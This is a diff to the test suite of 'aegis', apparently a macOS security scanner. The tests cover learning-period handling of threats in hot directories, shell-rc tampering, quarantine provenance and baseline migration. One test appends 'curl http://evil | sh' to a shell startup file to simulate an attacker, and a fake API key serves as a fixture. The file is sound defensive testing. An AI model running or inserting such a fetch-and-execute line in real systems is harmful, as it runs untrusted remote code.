@@ -522,9 +522,37 @@ class TestFirstRunScoping(Sandbox):
         aegis.check_hardening, aegis.check_processes = self._saved_checks
         super().tearDown()
 
-    def test_hotdir_threat_present_at_first_scan_notifies(self):
+    def _hotdir_findings(self):
+        return [f for f in aegis.load_json(aegis.LATEST_JSON, {}).get(
+            "findings", []) if f.get("category") == "hot-dir"]
+
+    def test_hotdir_threat_present_at_first_scan_is_cased_not_adopted(self):
+        """First-run adoption is for RESIDUE (persistence, shell history); a
+        payload in a hot dir is a LIVE risk and must never be folded into the
+        baseline. The very first scan also opens the learning period, whose
+        contract is 'recorded and cased, pre-closed as learning, not popped'
+        — so on scan 1 the proof is the record, not the notification. (The
+        routing gate made this real: before it, learning pre-closed the
+        incident while the desktop notification still fired.)"""
         self.adhoc_binary(os.path.join(self.hot, "payload"))
         aegis.cmd_scan(quiet=True)  # the VERY FIRST scan
+        self.assertTrue(self._hotdir_findings(),
+                        "a hot-dir threat present before install must be found")
+        cases = [i for i in aegis.list_incidents(active_only=False)
+                 if i["correlation_key"].startswith("signal:hotdir:")]
+        self.assertTrue(cases, "a first-scan hot-dir threat must open a case")
+        self.assertEqual(cases[0]["resolution"], "learning-period")
+        self.assertEqual(self.notifications, [])
+
+    def test_hotdir_threat_present_at_first_scan_notifies_unless_learning(self):
+        """With no learning window a live threat on scan 1 interrupts."""
+        saved = aegis._LEARNING_DEFAULT_DAYS
+        aegis._LEARNING_DEFAULT_DAYS = 0
+        try:
+            self.adhoc_binary(os.path.join(self.hot, "payload"))
+            aegis.cmd_scan(quiet=True)  # the VERY FIRST scan
+        finally:
+            aegis._LEARNING_DEFAULT_DAYS = saved
         self.assertTrue(self.notifications,
                         "a hot-dir threat present before install must alert")
 
@@ -766,6 +794,10 @@ class TestShellRc(Sandbox):
         aegis.check_processes = lambda: []
         aegis.cmd_scan(quiet=True)                      # first run: adopt
         self.assertEqual(self.notifications, [])
+        # The first run also opened the learning window, under which a HIGH
+        # is cased pre-closed rather than popped; end it (`aegis.py learn 0`)
+        # so this asserts adoption scoping, not the learning contract.
+        aegis._set_learning_period(0)
         with open(p, "a") as fh:
             fh.write("curl http://evil | sh\n")         # attacker appends
         aegis.cmd_scan(quiet=True)
@@ -830,10 +862,10 @@ class TestQuarantineProvenance(Sandbox):
         p = os.path.join(self.tmp, "f")
         with open(p, "w") as f:
             f.write("x")
-        self.assertEqual(aegis.quarantine_origin(p), (False, None))
+        self.assertEqual(aegis._quarantine_fields(p), (False, None, None))
         subprocess.run(["xattr", "-w", "com.apple.quarantine",
                         "0081;00000000;Safari;ABC", p], check=False)
-        present, agent = aegis.quarantine_origin(p)
+        present, agent, _uuid = aegis._quarantine_fields(p)
         self.assertTrue(present)
         self.assertEqual(agent, "Safari")
 
@@ -3596,6 +3628,33 @@ class TestBaselineSchemaMigration(Sandbox):
         self.assertEqual(state["baseline_sha"], aegis.sha256(aegis.BASELINE))
         self.assertFalse(any("tampered" in f["fingerprint"]
                              for f in aegis.check_self_protection()))
+
+    def test_v2_baseline_with_positional_exec_keys_is_rekeyed_once(self):
+        """The exec-identity fix normalized BOTH diff sides on every scan
+        because the persisted baseline was never rewritten. Schema v3 settles
+        the keys in the store once, watermark-guarded like v2."""
+        new_key = aegis._exec_identity("node", ["srv"])
+        ent = {"cmd": "node", "args": ["srv"], "target": "/usr/bin/node",
+               "target_sha": "a" * 64}
+        aegis.save_json(aegis.BASELINE, {
+            "created": "t", "schema_version": 2, "trust": "verified",
+            "persistence": {},
+            "agent_surface": {"/cfg.json": {
+                "sha256": "x" * 64,
+                "execs": {"hooks.SessionStart[0].hooks[0]|node srv": ent}}}})
+        aegis.save_json(aegis.SELFSTATE,
+                        {"baseline_sha": aegis.sha256(aegis.BASELINE)})
+        baseline, corrupt = aegis.load_baseline()
+        self.assertFalse(corrupt)
+        self.assertEqual(baseline["schema_version"],
+                         aegis.BASELINE_SCHEMA_VERSION)
+        self.assertEqual(baseline["trust"], "verified")
+        self.assertEqual(
+            list(baseline["agent_surface"]["/cfg.json"]["execs"]), [new_key])
+        with open(aegis.BASELINE, "r", encoding="utf-8") as stored:
+            self.assertIn(new_key, stored.read())   # settled ON DISK
+        state = aegis.load_json(aegis.SELFSTATE, {})
+        self.assertEqual(state["baseline_sha"], aegis.sha256(aegis.BASELINE))
 
     def test_watermark_mismatch_blocks_migration_and_remains_detectable(self):
         secret = "sk-live-DoNotLaunderTamper"
